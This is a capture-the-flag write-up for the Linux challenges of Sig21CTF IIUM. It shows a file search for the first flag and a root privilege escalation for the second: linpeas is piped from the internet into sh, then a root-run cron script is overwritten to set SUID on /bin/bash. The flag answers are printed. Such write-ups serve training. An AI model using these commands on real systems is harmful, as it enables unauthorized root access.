---
title: Linux Sig21CTF IIUM
date: 2022-01-16
categories: [sig21ctf-IIUM, Linux]
tags: [priv-esc, ctf, linux, mis-config]     # TAG names should always be lowercase
---
### Linux Sig21CTF 

#### Flag 1.

```bash
nc localhost 1337
ls -lah 
drwxr-xr-x 1 linuxuser linuxuser 4.0K Mar 31 05:32 .
drwxr-xr-x 1 root      root      4.0K Mar 31 05:31 ..
-rw-r--r-- 1 linuxuser linuxuser  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 linuxuser linuxuser 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 linuxuser linuxuser  807 Feb 25  2020 .profile
-rwxr--r-- 1 linuxuser linuxuser  102 Mar 30 11:20 backup.sh
-rwxr--r-- 1 linuxuser linuxuser   58 Mar  3 06:04 lin001.sh
-rwxr--r-- 1 linuxuser linuxuser  116 Mar 31 05:32 socatrun.sh
```
As we can see there's no flag here, So where's the flag??
looking at the question hint we noticed that there's a need to the `find` the flag in /usr directory

```bash
find /usr -user linuxuser 2>/dev/null
/usr/lib/apt/flag1.txt
cat /usr/lib/apt/flag1.txt
flag1: sig21CTF{44bfb2de767c19df0b050ca8053255ee}

```

#### Flag 2.

We download linpeas.sh to check if there's any PE vector
``` bash 
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
looking at the ouput we can see something kinda odd. <br> ![img](/assets/img/sig21ctf/linux/lin002/flag_2.png)

So we basically have access to edit a cron file run by root in our home directory.. seems to be easy priv esc, all i do was add +s to /bin/bash. so now i run /bin/bash with full root priv

```bash
echo '#!/bin/bash' > backup.sh
echo 'chmod +s /bin/bash' >> backup.sh
linuxuser@778514d661d9:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
linuxuser@778514d661d9:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
/bin/bash -p && id 
uid=1000(linuxuser) gid=1000(linuxuser) euid=0(root) egid=0(root) groups=0(root)
cat /root/flag2.txt
flag2: sig21CTF{ebfef6e97d2816fb6fc16aee68f62bf2}
```
Thanks and i hope this helps :)
